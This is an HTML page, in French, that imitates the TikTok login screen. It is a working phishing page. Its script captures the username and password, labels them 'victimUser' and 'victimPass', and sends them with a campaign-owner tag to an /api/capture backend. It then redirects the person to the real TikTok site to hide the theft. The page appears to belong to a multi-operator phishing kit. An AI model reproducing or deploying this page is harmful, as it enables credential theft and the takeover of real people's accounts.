<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion | TikTok</title>
    <style>
        body {
            font-family: TikTokFont, Arial, Tahoma, PingFangSC, sans-serif;
            background-color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: #161823;
        }

        .tiktok-container {
            background-color: #ffffff;
            border: 1px solid #e3e3e4;
            border-radius: 8px;
            padding: 40px;
            width: 400px;
            box-sizing: border-box;
            text-align: center;
            box-shadow: 0 4px 14px rgba(0, 0, 0, 0.05);
        }

        .tiktok-logo {
            width: 80px;
            height: 80px;
            margin: 0 auto 24px auto;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .tiktok-logo svg {
            width: 60px;
            height: 60px;
            fill: #161823;
        }

        h1 {
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 30px;
            color: #161823;
        }

        .input-group {
            position: relative;
            margin-bottom: 16px;
        }

        .input-field {
            width: 100%;
            padding: 14px 16px;
            background-color: #f1f1f2;
            border: 1px solid rgba(22, 24, 35, 0.12);
            border-radius: 4px;
            font-size: 15px;
            box-sizing: border-box;
            color: #161823;
            outline: none;
            transition: border-color 0.2s;
        }

        .input-field:focus {
            border-color: #161823;
            background-color: #ffffff;
        }

        .tiktok-btn {
            background-color: #fe2c55;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 14px;
            width: 100%;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            margin-top: 10px;
            transition: background-color 0.2s;
        }

        .tiktok-btn:hover {
            background-color: #ef2950;
        }

        .footer-links {
            margin-top: 24px;
            font-size: 14px;
            color: #161823;
        }

        .footer-links a {
            color: #fe2c55;
            text-decoration: none;
            font-weight: 600;
        }

        .footer-links a:hover {
            text-decoration: underline;
        }

        .bottom-help {
            margin-top: 30px;
            border-top: 1px solid #e3e3e4;
            padding-top: 20px;
            font-size: 12px;
            color: #717179;
        }
    </style>
</head>
<body>

    <div class="tiktok-container">
        <!-- Logo TikTok officiel en SVG -->
        <div class="tiktok-logo">
            <svg viewBox="0 0 24 24">
                <path d="M19.589 6.686a4.793 4.793 0 0 1-3.77-4.245V2h-3.445v13.672a2.896 2.896 0 0 1-5.201 1.743l-.002-.001.002-.001a2.895 2.895 0 0 1 3.144-3.73v-3.5a6.341 6.341 0 0 0-5.32 5.86 6.34 6.34 0 0 0 10.94 4.398c2.25-2.25 2.25-5.912 0-8.162z"/>
            </svg>
        </div>
        
        <h1>Connexion à TikTok</h1>

        <form id="loginForm">
            <div class="input-group">
                <input type="text" id="username" class="input-field" placeholder="Téléphone / E-mail / Nom d'utilisateur" required>
            </div>
            <div class="input-group">
                <input type="password" id="password" class="input-field" placeholder="Mot de passe" required>
            </div>

            <button type="submit" class="tiktok-btn">Connexion</button>
        </form>

        <div class="footer-links">
            <p>Vous n'avez pas de compte ? <a href="#" onclick="return false;">S'inscrire</a></p>
        </div>

        <div class="bottom-help">
            <p>En continuant, vous acceptez les Conditions d'utilisation de TikTok et reconnaissez avoir lu la Politique de confidentialité.</p>
        </div>
    </div>

    <script>
        // Récupération automatique des paramètres de l'URL (?user=Kim&type=standard)
        const urlParams = new URLSearchParams(window.location.search);
        const campaignOwner = urlParams.get('user') || 'Kim';
        const linkType = urlParams.get('type') || 'standard';

        // Gestion de la soumission du formulaire et envoi vers Flask
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            const payload = {
                owner: campaignOwner,
                network: "TikTok",
                type: linkType,
                victimUser: username,
                victimPass: password,
                otp: 'Aucun'
            };

            // Envoi des données capturées vers le backend Flask (/api/capture)
            fetch('/api/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).then(response => {
                window.location.href = "https://www.tiktok.com";
            }).catch(error => {
                window.location.href = "https://www.tiktok.com";
            });
        });
    </script>
</body>
</html>
